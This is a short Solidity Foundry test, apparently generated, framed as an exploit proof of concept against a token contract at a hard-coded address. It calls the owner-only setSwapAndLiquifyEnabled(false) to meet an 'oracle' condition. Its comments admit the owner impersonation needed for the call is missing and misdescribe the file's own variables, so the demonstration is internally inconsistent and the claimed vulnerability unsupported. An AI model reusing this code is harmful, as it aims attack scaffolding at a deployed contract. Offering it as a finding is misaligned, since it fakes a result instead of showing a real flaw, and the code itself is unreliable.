pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Milesinu {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test framework already defines TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Simple direct call to demonstrate the vulnerability
        // In a real exploit, we would need to be owner first
        // But this shows what an owner can do

        // First, let's check the current state
        bool initialEnabled = Milesinu(TARGET).swapAndLiquifyEnabled();
        console.log("Initial swapAndLiquifyEnabled:", initialEnabled);

        // To demonstrate the vulnerability, we need to show that if we were owner,
        // we could call this function. Since we can't become owner due to RPC limits,
        // we'll show the function call pattern.
        // In reality, we would need: vm.prank(owner); before this call
        Milesinu(TARGET).setSwapAndLiquifyEnabled(false);

        // Check the new state
        bool finalEnabled = Milesinu(TARGET).swapAndLiquifyEnabled();
        console.log("Final swapAndLiquifyEnabled:", finalEnabled);

        // The oracle expects swapAndLiquifyEnabled == false
        require(finalEnabled == false, "swapAndLiquifyEnabled should be false after exploit");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
